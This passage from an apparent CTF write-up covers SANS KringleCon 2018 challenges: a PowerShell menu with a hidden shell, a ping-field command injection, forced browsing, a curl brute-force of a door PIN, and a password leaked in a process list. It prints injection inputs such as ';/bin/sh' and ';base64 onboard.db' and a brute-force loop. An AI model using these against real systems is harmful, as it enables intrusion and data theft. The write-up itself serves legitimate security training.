    <span class="nv">$eemail</span> <span class="p">=</span> <span class="nb">Read-Host</span> <span class="s2">&quot;Enter your email address.</span><span class="se">`n</span><span class="s2">&quot;</span>

    <span class="nb">Write-Host</span> <span class="s2">&quot;</span><span class="se">`n`n</span><span class="s2">Is this correct?</span><span class="se">`n`n</span><span class="s2">&quot;</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;$efirst $elast&quot;</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;$estreet1&quot;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$estreet2</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">Write-Host</span> <span class="s2">&quot;$estreet2&quot;</span>
    <span class="p">}</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;$ecity, $epostalcode&quot;</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;$ephone&quot;</span>
    <span class="nb">Write-Host</span> <span class="s2">&quot;$eemail&quot;</span>

    <span class="nv">$input</span> <span class="p">=</span> <span class="nb">Read-Host</span> <span class="s1">&#39;y/n&#39;</span>
    <span class="k">if</span> <span class="p">(</span><span class="nv">$input</span> <span class="o">-eq</span> <span class="s1">&#39;y&#39;</span> <span class="o">-Or</span> <span class="nv">$input</span> <span class="o">-eq</span> <span class="s1">&#39;Y&#39;</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">Write-Host</span> <span class="s2">&quot;Save to sqlite DB using command line&quot;</span>
        <span class="nb">Start-Process</span> <span class="n">-FilePath</span> <span class="s2">&quot;./sqlite3&quot;</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;onboard.db </span><span class="se">`&quot;</span><span class="s2">INSERT INTO onboard (fname, lname, street1, street2, city, postalcode, phone, email) VALUES (</span><span class="se">`&#39;</span><span class="s2">$efirst</span><span class="se">`&#39;</span><span class="s2">,</span><span class="se">`&#39;</span><span class="s2">$elast</span><span class="se">`&#39;</span><span class="s2">, </span><span class="se">`&#39;</span><span class="s2">$estreet1</span><span class="se">`&#39;</span><span class="s2">, </span><span class="se">`&#39;</span><span class="s2">$estreet2</span><span class="se">`&#39;</span><span class="s2">, </span><span class="se">`&#39;</span><span class="s2">$ecity</span><span class="se">`&#39;</span><span class="s2">, </span><span class="se">`&#39;</span><span class="s2">$epostalcode</span><span class="se">`&#39;</span><span class="s2">, </span><span class="se">`&#39;</span><span class="s2">$ephone</span><span class="se">`&#39;</span><span class="s2">, </span><span class="se">`&#39;</span><span class="s2">$eemail</span><span class="se">`&#39;</span><span class="s2">)</span><span class="se">`&quot;</span><span class="s2">&quot;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">try</span>
<span class="p">{</span>
    <span class="k">do</span>
    <span class="p">{</span>
        <span class="nb">Show-Menu</span>
        <span class="nv">$input</span> <span class="p">=</span> <span class="nb">Read-Host</span> <span class="s1">&#39;Please make a selection&#39;</span>
        <span class="k">switch</span> <span class="p">(</span><span class="nv">$input</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="s1">&#39;1&#39;</span> <span class="p">{</span>
                <span class="n">cls</span>
                <span class="n">Employee-Onboarding-Form</span>
            <span class="p">}</span> <span class="s1">&#39;2&#39;</span> <span class="p">{</span>
                <span class="n">cls</span>
                <span class="nb">Write-Host</span> <span class="s2">&quot;Validating data store for employee onboard information.&quot;</span>
                <span class="nv">$server</span> <span class="p">=</span> <span class="nb">Read-Host</span> <span class="s1">&#39;Enter address of server&#39;</span>
                <span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">bash</span> <span class="n">-c</span> <span class="s2">&quot;/bin/ping -c 3 $server&quot;</span>
                <span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">bash</span> <span class="n">-c</span> <span class="s2">&quot;/usr/bin/file onboard.db&quot;</span>
<span class="hll">            <span class="p">}</span> <span class="s1">&#39;9&#39;</span> <span class="p">{</span>
</span><span class="hll">                <span class="p">/</span><span class="n">usr</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">pwsh</span>
</span>                <span class="k">return</span>
            <span class="p">}</span> <span class="s1">&#39;q&#39;</span> <span class="p">{</span>
                <span class="k">return</span>
            <span class="p">}</span> <span class="k">default</span> <span class="p">{</span>
                <span class="nb">Write-Host</span> <span class="s2">&quot;Invalid entry.&quot;</span>
            <span class="p">}</span>
        <span class="p">}</span>
        <span class="n">pause</span>
    <span class="p">}</span>
    <span class="k">until</span> <span class="p">(</span><span class="nv">$input</span> <span class="o">-eq</span> <span class="s1">&#39;q&#39;</span><span class="p">)</span>
<span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
<span class="p">}</span>
</pre></div>
<p>It seems that our menu has an hidden function. If we input <code>9</code>, we get
access to a PowerShell console. Let's do so, and use our shell to analyze the
<code>onboard.db</code> file:</p>
<div class="highlight"><pre><span></span><span class="hll"><span class="go">Please make a selection: 9</span>
</span><span class="go">PowerShell v6.0.3</span>
<span class="go">Copyright (c) Microsoft Corporation. All rights reserved.</span>

<span class="go">https://aka.ms/pscore6-docs</span>
<span class="go">Type &#39;help&#39; to get help.</span>

<span class="hll"><span class="go">PS /home/elf&gt; sqlite3 ./onboard.db</span>
</span><span class="go">SQLite version 3.11.0 2016-02-15 17:29:24</span>
<span class="go">Enter &quot;.help&quot; for usage hints.</span>
<span class="hll"><span class="go">sqlite&gt; .schema</span>
</span><span class="go">CREATE TABLE onboard (</span>
<span class="go">    id INTEGER PRIMARY KEY,</span>
<span class="go">    fname TEXT NOT NULL,</span>
<span class="go">    lname TEXT NOT NULL,</span>
<span class="go">    street1 TEXT,</span>
<span class="go">    street2 TEXT,</span>
<span class="go">    city TEXT,</span>
<span class="go">    postalcode TEXT,</span>
<span class="go">    phone TEXT,</span>
<span class="go">    email TEXT</span>
<span class="go">);</span>
<span class="hll"><span class="go">sqlite&gt; select * from onboard where lname = &#39;Chan&#39;;</span>
</span><span class="go">84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com</span>
</pre></div>
<p>Hello, Scott Chan! We can now use <code>runtoanswer</code> to input our answer:</p>
<div class="highlight"><pre><span></span><span class="go">PS /home/elf&gt; ./runtoanswer</span>
<span class="go">Loading, please wait.....</span>
<span class="hll"><span class="go">Enter Mr. Chan&#39;s first name: Scott</span>
</span>
<span class="go">    .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:&#39;</span>
<span class="go">  &#39;ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO   Okdooooooooooooo;</span>
<span class="go"> &#39;oooooooooooooX  ooooO  xod       xoO  xooooo  Xoooook    0    Oooooooooooooo;</span>
<span class="go"> :oooooooooooooX  ooooO  xod  0ooooooO  xooooo  Xoooox   ooooo   kooooooooooooo</span>
<span class="go"> coooooooooooooX         xod      0ooO  xooooo  XooooO  koooook   ooooooooooooo</span>
<span class="go"> coooooooooooooX  dddd0  xod  0ddddooO  xooooo  XooooO  OoooooO  kooooooooooooo</span>
<span class="go"> coooooooooooooX  ooooO  xod  KxxxxdoO  Okkkxo  XkkkkdX   xxk    oooooooooooooo</span>
<span class="go"> cooooooooooooo0  ooook  dod       kok      Oo      Xook      Kxooooooooooooooo</span>
<span class="go"> cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo</span>
<span class="go"> cooooooooooooooooooooooooooooooooo MY NAME IS oooooooooooooooooooooooooooooooo</span>
<span class="go"> cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo</span>
<span class="go"> OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW</span>
<span class="go"> OMMMMMMMMMMMMW:  .. ;MMMk&#39;     .NMX:.  .  .lWO         d         xMMMMMMMMMMMW</span>
<span class="go"> OMMMMMMMMMMMMo  OMMWXMMl  lNMMNxWK  ,XMMMO  .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW</span>
<span class="go"> OMMMMMMMMMMMMX.  .cOWMN  &#39;MMMMMMM;  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW</span>
<span class="go"> OMMMMMMMMMMMMMMKo,   KN  ,MMMMMMM,  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW</span>
<span class="go"> OMMMMMMMMMMMMKNMMMO  oM,  dWMMWOWk  cWMMMO  ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW</span>
<span class="go"> OMMMMMMMMMMMMc ...  cWMWl.  .. .NMk.  ..  .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW</span>
<span class="go"> xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK</span>
<span class="go"> .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,</span>
<span class="go">  .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,</span>
<span class="go">    .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;.</span>

<span class="go">Congratulations!</span>
</pre></div>
<p>Lucky we had this hidden functionality. But what if it wasn't there? Well, we
can still use our command injection vulnerability to drop to a shell:</p>
<div class="highlight"><pre><span></span>Validating data store for employee onboard information.
<span class="hll">Enter address of server: ;/bin/sh
</span>Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
<span class="hll">$ ls
</span>menu.ps1  onboard.db  runtoanswer
</pre></div>
<p>And what if we can't run <code>/bin/sh</code>? Well, we can still recover the SQLite
database file, and analyze it offline. To do so, we can base64 encode it, which
is kind of my favorite trick:</p>
<div class="highlight"><pre><span></span>Validating data store for employee onboard information.
<span class="hll">Enter address of server: ;base64 onboard.db
</span>Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
U1FMaXRlIGZvcm1hdCAzABAAAQEAQCAgAAAAAQAAAAYAAAAAAAAAAAAAAAEAAAAEAAAAAAAAAAAA
AAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAC4FQg0AAAABDxUADxUAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[snip]
</pre></div>
<p>We then copy/paste the encoded file to our computer, decode it, and interrogate
it:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> base64 -d &lt; onboard.db.b64 &gt; onboard.db
<span class="gp">$</span> file onboard.db
<span class="go">onboard.db: SQLite 3.x database, last written using SQLite version 3016002</span>
<span class="gp">$</span> sqlite3 onboard.db
<span class="go">SQLite version 3.22.0 2018-01-22 18:45:57</span>
<span class="go">Enter &quot;.help&quot; for usage hints.</span>
<span class="go">sqlite&gt; select * from onboard where lname=&quot;Chan&quot;;</span>
<span class="go">84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com</span>
</pre></div>
</div>
<div class="section" id="analyzing-the-kringlecon-cfp-website">
<h3><a class="toc-backref" href="#id11">Analyzing the KringleCon CFP website</a></h3>
<p>We're asked to find who submitted the rejected talk titled <strong>Data Loss for
Rainbow Teams: A Path in the Darkness</strong>, and to take a look at <a class="reference external" href="https://cfp.kringlecastle.com/">KringleCon's
CFP website</a> to find out.</p>
<p>The web site is simple enough, and has a link marked &quot;CFP&quot;. When we click on
it, we're taken to the webpage <a class="reference external" href="https://cfp.kringlecastle.com/cfp/cfp.html">https://cfp.kringlecastle.com/cfp/cfp.html</a>,
which tells us that the CFP is closed. However, we're not at the root of the
<code>cfp</code> folder. Let's forcefully browse to
<a class="reference external" href="https://cfp.kringlecastle.com/cfp/">https://cfp.kringlecastle.com/cfp/</a>:</p>
<img alt="cfp_rejected_talks.png" class="align-center" src="/images/sans-christmas-challenge-2018/cfp_rejected_talks.png" />
<p>We find a CSV file called <code>rejected-talks.csv</code>. If we search the talk
name in it, we'll find that submitter is one <a class="reference external" href="https://en.wikipedia.org/wiki/John_McClane">John McClane</a>:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> curl https://cfp.kringlecastle.com/cfp/rejected-talks.csv <span class="m">2</span>&gt; /dev/null <span class="p">|</span> grep -i <span class="s1">&#39;Data Loss for Rainbow Teams: A Path in the Darkness&#39;</span>
<span class="go">qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11</span>
</pre></div>
</div>
</div>
<div class="section" id="de-bruijn-sequences">
<h2><a class="toc-backref" href="#id12">de Bruijn Sequences</a></h2>
<div class="section" id="tangle-coalbox-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id13">Tangle Coalbox's Cranberry Pi Challenge</a></h3>
<p>Apparently, a girl elf has been given a love poem by a boy elf, and ER (Elf
Ressources) has been involved, because a complaint has been made. We're asked
to find the firstname of the elf who received the love poem.</p>
<div class="highlight"><pre><span></span><span class="go">Christmas is coming, and so it would seem,</span>
<span class="go">ER (Elf Resources) crushes elves&#39; dreams.</span>
<span class="go">One tells me she was disturbed by a bloke.</span>
<span class="go">He tells me this must be some kind of joke.</span>
<span class="go">Please do your best to determine what&#39;s real.</span>
<span class="go">Has this jamoke, for this elf, got some feels?</span>
<span class="go">Lethal forensics ain&#39;t my cup of tea;</span>
<span class="go">If YOU can fake it, my hero you&#39;ll be.</span>
<span class="go">One more quick note that might help you complete,</span>
<span class="go">Clearing this mess up that&#39;s now at your feet.</span>
<span class="go">Certain text editors can leave some clue.</span>
<span class="go">Did our young Romeo leave one for you?</span>
<span class="go">- Tangle Coalbox, ER Investigator</span>
<span class="go">  Find the first name of the elf of whom a love poem</span>
<span class="go">  was written.  Complete this challenge by submitting</span>
<span class="go">  that name to runtoanswer.</span>
<span class="gp">elf@612b2a7501cc:~$</span>
</pre></div>
<p>Let's see what files we can see:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@6bb580d3ee2e:~$</span> ls -lha
<span class="go">total 5.4M</span>
<span class="go">drwxr-xr-x 1 elf  elf  4.0K Dec 14 16:28 .</span>
<span class="go">drwxr-xr-x 1 root root 4.0K Dec 14 16:28 ..</span>
<span class="go">-rw-r--r-- 1 elf  elf   419 Dec 14 16:13 .bash_history</span>
<span class="go">-rw-r--r-- 1 elf  elf   220 May 15  2017 .bash_logout</span>
<span class="go">-rw-r--r-- 1 elf  elf  3.5K Dec 14 16:28 .bashrc</span>
<span class="go">-rw-r--r-- 1 elf  elf   675 May 15  2017 .profile</span>
<span class="go">drwxr-xr-x 1 elf  elf  4.0K Dec 14 16:28 .secrets</span>
<span class="go">-rw-r--r-- 1 elf  elf  5.0K Dec 14 16:13 .viminfo</span>
<span class="go">-rwxr-xr-x 1 elf  elf  5.3M Dec 14 16:13 runtoanswer</span>
<span class="gp">elf@6bb580d3ee2e:~$</span> ls -lhaR .secrets/
<span class="go">.secrets/:</span>
<span class="go">total 12K</span>
<span class="go">drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 .</span>
<span class="go">drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 ..</span>
<span class="go">drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 her</span>
<span class="go">.secrets/her:</span>
<span class="go">total 12K</span>
<span class="go">drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 .</span>
<span class="go">drwxr-xr-x 1 elf elf 4.0K Dec 14 16:28 ..</span>
<span class="go">-rw-r--r-- 1 elf elf 1.9K Dec 14 16:13 poem.txt</span>
<span class="gp">elf@6bb580d3ee2e:~$</span> cat .secrets/her/poem.txt
<span class="go">Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,</span>
<span class="go">Shining many a beautiful sleighbell bearing cheer and sound so pure--</span>
<span class="go">  There he cleaned them, nearly napping, suddenly there came a tapping,</span>
<span class="go">As of someone gently rapping, rapping at the sleigh house door.</span>
<span class="go">&quot;&#39;Tis some caroler,&quot; he muttered, &quot;tapping at my sleigh house door--</span>
<span class="go">  Only this and nothing more.&quot;</span>
<span class="go">Then, continued with more vigor, came the sound he didn&#39;t figure,</span>
<span class="go">Could belong to one so lovely, walking &#39;bout the North Pole grounds.</span>
<span class="go">  But the truth is, she WAS knocking, &#39;cause with him she would be talking,</span>
<span class="go">Off with fingers interlocking, strolling out with love newfound?</span>
<span class="go">Gazing into eyes so deeply, caring not who sees their rounds.</span>
<span class="go">  Oh, &#39;twould make his heart resound!</span>
<span class="go">Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.</span>
<span class="go">Floating over, more than walking, moving toward the sound still knocking,</span>
<span class="go">  Pausing at the elf-length mirror, checked himself to study clearer,</span>
<span class="go">Fixing hair and looking nearer, what a hunky elf - not shocking!</span>
<span class="go">Peering through the peephole smiling, reaching forward and unlocking:</span>
<span class="go">  NEVERMORE in tinsel stocking!</span>
<span class="go">Greeting her with smile dashing, pearly-white incisors flashing,</span>
<span class="go">Telling jokes to keep her laughing, soaring high upon the tidings,</span>
<span class="go">  Of good fortune fates had borne him.  Offered her his dexter forelimb,</span>
<span class="go">Never was his future less dim!  Should he now consider gliding--</span>
<span class="go">No - they shouldn&#39;t but consider taking flight in sleigh and riding</span>
<span class="go">  Up above the Pole abiding?</span>
<span class="go">Smile, she did, when he suggested that their future surely rested,</span>
<span class="go">Up in flight above their cohort flying high like ne&#39;er before!</span>
<span class="go">  So he harnessed two young reindeer, bold and fresh and bearing no fear.</span>
<span class="go">In they jumped and seated so near, off they flew - broke through the door!</span>
<span class="go">Up and up climbed team and humor, Morcel being so adored,</span>
<span class="go">  By his lovely NEVERMORE!</span>
<span class="go">-Morcel Nougat</span>
</pre></div>
<p>We find the poem in the <code>.secrets</code> folder. Good stuff, there, Morcel...
Anyway, I first thought that the name of the elf was Nevermore, however it was
not the case. So let's keep looking.</p>
<div class="highlight"><pre><span></span><span class="gp">elf@6bb580d3ee2e:~$</span> cat .bash_history
<span class="go">set -o history</span>
<span class="go">whoami</span>
<span class="go">echo &quot;No, really...  /-:&quot;</span>
<span class="go">mkdir -p .secrets/her/</span>
<span class="go">firefox https://www.google.com/search?q=love+poetry</span>
<span class="go">vim</span>
<span class="go">ls -lAR</span>
<span class="go">exit</span>
<span class="go">set -o history</span>
<span class="go">df -h</span>
<span class="go">who</span>
<span class="hll"><span class="go">firefox https://www.google.com/search?q=replacing+strings+in+vim</span>
</span><span class="go">time vim</span>
<span class="go">ls -lAR</span>
<span class="go">exit</span>
<span class="go">set -o history</span>
<span class="go">vim</span>
<span class="go">exit</span>
<span class="go">ls -lA</span>
<span class="go">cat .bash_history</span>
<span class="go">echo &quot;&quot; &gt;&gt; .bash_history</span>
<span class="go">firefox https://www.google.com/search?q=turn+off+bash+history</span>
<span class="go">set +o history</span>
<span class="go">set +o history</span>
</pre></div>
<p>Apparently, in addition to ripping off love poem from the web, Morcel searched
how to replace strings in <code>vim</code>. So he must have used <code>vim</code> to
write the poem. Let's take a look at the <code>.viminfo</code> file:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@6bb580d3ee2e:~$</span> cat .viminfo
<span class="gp">#</span> This viminfo file was generated by Vim <span class="m">8</span>.0.
<span class="gp">#</span> You may edit it <span class="k">if</span> you<span class="err">&#39;</span>re careful!
<span class="gp">#</span> Viminfo version
<span class="go">|1,4</span>
<span class="gp">#</span> Value of <span class="s1">&#39;encoding&#39;</span> when this file was written
<span class="go">*encoding=latin1</span>
<span class="gp">#</span> hlsearch on <span class="o">(</span>H<span class="o">)</span> or off <span class="o">(</span>h<span class="o">)</span>:
<span class="go">~h</span>
<span class="gp">#</span> Last Substitute Search Pattern:
<span class="hll"><span class="go">~MSle0~&amp;Elinore</span>
</span><span class="gp">#</span> Last Substitute String:
<span class="hll"><span class="gp">$</span>NEVERMORE
</span><span class="gp">#</span> Command Line History <span class="o">(</span>newest to oldest<span class="o">)</span>:
<span class="go">:q</span>
<span class="go">|2,0,1546268730,,&quot;q&quot;</span>
<span class="go">:wq</span>
<span class="go">|2,0,1536607231,,&quot;wq&quot;</span>
<span class="go">:%s/Elinore/NEVERMORE/g</span>
<span class="hll"><span class="go">|2,0,1536607217,,&quot;%s/Elinore/NEVERMORE/g&quot;</span>
</span><span class="go">[snip]</span>
</pre></div>
<p>So, the name of the elf who received the poem seems to be Elinore.</p>
</div>
<div class="section" id="kringlecon-speaker-unpreparedness-room">
<h3><a class="toc-backref" href="#id14">KringleCon Speaker Unpreparedness room</a></h3>
<p>We're in front of the unprepared speaker room, but there's a code to enter, by
pressing four different symbols, △□○☆:</p>
<img alt="door_code_intro.png" class="align-center" src="/images/sans-christmas-challenge-2018/door_code_intro.png" />
<div class="section" id="yannick-s-dirty-solution">
<h4><a class="toc-backref" href="#id15">Yannick's (dirty) solution</a></h4>
<p>By pressing four of the buttons randomly, we get an error message:</p>
<img alt="door_code_first_incorrect_guess.png" class="align-center" src="/images/sans-christmas-challenge-2018/door_code_first_incorrect_guess.png" />
<p>If we take a look at the network requests that were made, we can see that a
<code>GET</code> request was made to the <a class="reference external" href="https://doorpasscoden.kringlecastle.com/checkpass.php?i=0003&amp;resourceId=undefined">https://doorpasscoden.kringlecastle.com/checkpass.php?i=0003&amp;resourceId=undefined</a>
URL.</p>
<p>The <code>i</code> variable seems to be holding our passcode. If we click another
button, another request is directly made to <a class="reference external" href="https://doorpasscoden.kringlecastle.com/checkpass.php?i=0031&amp;resourceId=undefined">https://doorpasscoden.kringlecastle.com/checkpass.php?i=0031&amp;resourceId=undefined</a></p>
<img alt="door_code_second_incorrect_guess.png" class="align-center" src="/images/sans-christmas-challenge-2018/door_code_second_incorrect_guess.png" />
<p>We can see that our <code>i</code> variable went from <code>0003</code> to <code>0031</code>.
From this, we can see that:</p>
<ul class="simple">
<li>△ = 0</li>
<li>□ = 1</li>
<li>○ = 2</li>
<li>☆ = 3</li>
</ul>
<p>A four-digit PIN means 10.000 possible values. It's quite easily manageable
by bruteforce, even online. So let's write a simple one-liner that will try
every possible value:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> <span class="k">for</span> i in <span class="sb">`</span>seq -w <span class="m">9999</span><span class="sb">`</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> curl <span class="s2">&quot;https://doorpasscoden.kringlecastle.com/checkpass.php?i=</span><span class="nv">$i</span><span class="s2">&amp;resourceId=undefined&quot;</span> &gt; <span class="nv">$i</span>.txt <span class="m">2</span>&gt;/dev/null <span class="p">&amp;</span> <span class="k">done</span>
</pre></div>
<p>This loop will generate every number between <code>0000</code> and <code>9999</code>,
perform a <code>GET</code> request to the URL that checks the passcode, and save the
output in a file named after the passcode. The <code>&amp;</code> before the
<code>done</code> means that our <code>curl</code> commands will run in their own thread.
After a few seconds, we can list our different files, and sort them by size:</p>
<div class="highlight"><pre><span></span><span class="gp">$</span> ls -lhSr
<span class="go">[snip]</span>
<span class="go">-rw-r--r-- 1 XXX XXX  46 déc.  31 16:18 0001.txt</span>
<span class="hll"><span class="go">-rw-r--r-- 1 XXX XXX 142 déc.  31 16:18 0120.txt</span>
</span><span class="gp">$</span> cat <span class="m">0120</span>.txt
<span class="go">{&quot;success&quot;:true,&quot;resourceId&quot;:&quot;undefined&quot;,&quot;hash&quot;:&quot;0273f6448d56b3aba69af76f99bdc741268244b7a187c18f855c6302ec93b703&quot;,&quot;message&quot;:&quot;Correct guess!&quot;}</span>
</pre></div>
<p>Our largest file was <code>0120.txt</code>, which gives us the correct passcode,
<code>0120</code>, which means △□○△. Let's input this on the website:</p>
<img alt="door_code_correct_guess.png" class="align-center" src="/images/sans-christmas-challenge-2018/door_code_correct_guess.png" />
<p>This gives us the message <code>Welcome unprepared speaker!</code>.</p>
</div>
<div class="section" id="the-official-solution">
<h4><a class="toc-backref" href="#id16">The &quot;official&quot; solution</a></h4>
<p>The name of the challenge, and Tangle Coalbox, hint at taking a look at de
Bruijn sequence. Indeed, since the code is tested every time the button is
pressed, we don't have to perform a full bruteforce attack. We can generate a
de Bruijn sequence of four symbols (length of the PIN) chosen in a set of four
symbols (the number of buttons we have). This sequence tells us which buttons
to push. Let's use <a class="reference external" href="http://www.hakank.org/comb/debruijn.cgi">this website</a>
to generate our sequence, with parameters <span class="formula"><i>k</i> = 4, <i>n</i> = 4</span>. The sequence is:</p>
<blockquote>
0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 <strong>0 1 2 0</strong> 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3</blockquote>
<p>If we input this sequence, we get the correct code after pressing only 22
buttons.</p>
</div>
</div>
</div>
<div class="section" id="data-repo-analysis">
<h2><a class="toc-backref" href="#id17">Data Repo Analysis</a></h2>
<p>After solving the last challenge, stuff begins to happen at KringleCon:</p>
<img alt="toy_soldier_blue.png" class="align-center" src="/images/sans-christmas-challenge-2018/toy_soldier_blue.png" />
<p><em>Here's what's happening</em></p>
<blockquote>
<p><em>Suddenly, all elves in the castle start looking very nervous. You can
overhear some of them talking with worry in their voices.</em></p>
<p><em>The toy soldiers, who were always gruff, now seem especially determined as
they lock all the exterior entrances to the building and barricade all the
doors. No one can get out! And the toy soldiers' grunts take on an
increasingly sinister tone.</em></p>
</blockquote>
<p>Uh-oh, seems like sh*t's about to go down! Let's keep solving our challenges,
maybe we'll learn more about this.</p>
<div class="section" id="wunorse-openslae-s-cranberry-pi-challenge">
<h3><a class="toc-backref" href="#id18">Wunorse Openslae's Cranberry Pi Challenge</a></h3>
<p>Wunorse Openslae is supposed to upload his report to a samba share, but can't
remember the password. We're supposed to help him uploading his report:</p>
<div class="highlight"><pre><span></span><span class="go">Thank you Madam or Sir for the help that you bring!</span>
<span class="go">I was wondering how I might rescue my day.</span>
<span class="go">Finished mucking out stalls of those pulling the sleigh,</span>
<span class="go">My report is now due or my KRINGLE&#39;s in a sling!</span>
<span class="go">There&#39;s a samba share here on this terminal screen.</span>
<span class="go">What I normally do is to upload the file,</span>
<span class="go">With our network credentials (we&#39;ve shared for a while).</span>
<span class="go">When I try to remember, my memory&#39;s clean!</span>
<span class="go">Be it last night&#39;s nog bender or just lack of rest,</span>
<span class="go">For the life of me I can&#39;t send in my report.</span>
<span class="go">Could there be buried hints or some way to contort,</span>
<span class="go">Gaining access - oh please now do give it your best!</span>
<span class="go">-Wunorse Openslae</span>
<span class="go">Complete this challenge by uploading the elf&#39;s report.txt</span>
<span class="go">file to the samba share at //localhost/report-upload/</span>
<span class="gp">elf@566501e7c881:~$</span>
</pre></div>
<p>I tried the usual suspects: bash history files, looking at
<code>/etc/samba/smb.conf</code>, looking into <code>/var/log</code>, looking at
<code>cron</code> files, checking what I could run with <code>sudo</code>, etc. This did
not give anything interesting. However, the next usual suspect gave something.
I checked what was running on the server, using <code>ps</code>:</p>
<div class="highlight"><pre><span></span><span class="gp">elf@b08c86087276:~$</span> ps aux <span class="p">|</span> less
<span class="go">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span>
<span class="go">root         1  0.0  0.0  17952  2860 pts/0    Ss   22:22   0:00 /bin/bash /sbin/init</span>
<span class="go">root        11  0.0  0.0  45320  3060 pts/0    S    22:22   0:00 sudo -u manager /home/manager/</span>
<span class="go">samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not</span>
<span class="go">-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress</span>
<span class="hll"><span class="go">//localhost/report-upload/ directreindeerflatterystable -U report-upload</span>
</span><span class="go">root        16  0.0  0.0  45320  3180 pts/0    S    22:22   0:00 sudo -u elf /bin/bash</span>
<span class="go">manager     18  0.0  0.0   9500  2412 pts/0    S    22:22   0:00 /bin/bash /home/manager/samba-</span>
<span class="go">wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-a</span>
